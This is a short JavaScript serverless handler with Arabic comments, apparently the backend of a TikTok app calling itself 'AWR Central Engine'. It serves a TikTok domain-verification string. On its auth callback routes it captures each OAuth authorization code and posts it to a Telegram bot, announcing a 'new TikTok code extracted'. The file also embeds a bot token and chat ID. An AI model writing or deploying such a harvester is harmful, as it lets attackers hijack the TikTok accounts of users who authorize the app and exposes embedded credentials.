const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  
  const url = req.url || '';

  // مسار التوثيق التلقائي لنطاق تيك توك
  if (url.includes('tiktok-developers-site-verification')) {
    res.setHeader('Content-Type', 'text/plain');
    return res.end('Tiktok-developers-site-verification=X0rbCBz0sv0XGnslTmw9ZyRWVDIdmha5');
  }

  // مسار استقبال والتحقق والاستخراج
  if (url.includes('/api/callback') || url.includes('/api/auth')) {
    const urlParts = url.split('?');
    const queryString = urlParts.length > 1 ? urlParts[1] : '';
    const params = new URLSearchParams(queryString);
    const code = params.get('code');

    // إذا تم لقط كود حقيقي، يتم إرساله فوراً إلى البوت
    if (code) {
      const messageText = `🎯 *تم استخراج رمز تيك توك جديد!*\n\n🔑 *الـ Code:* \`${code}\`\n\n⚙️ *المحرك:* AWR Central Engine`;
      
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error('Telegram notification failed:', err);
      }
    }

    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({
      status: "success",
      message: "AWR Engine: Interface Ready",
      received_code: code || "No code provided yet"
    }));
  }

  res.setHeader('Content-Type', 'text/plain');
  res.end('AWR Central Engine Ready');
};
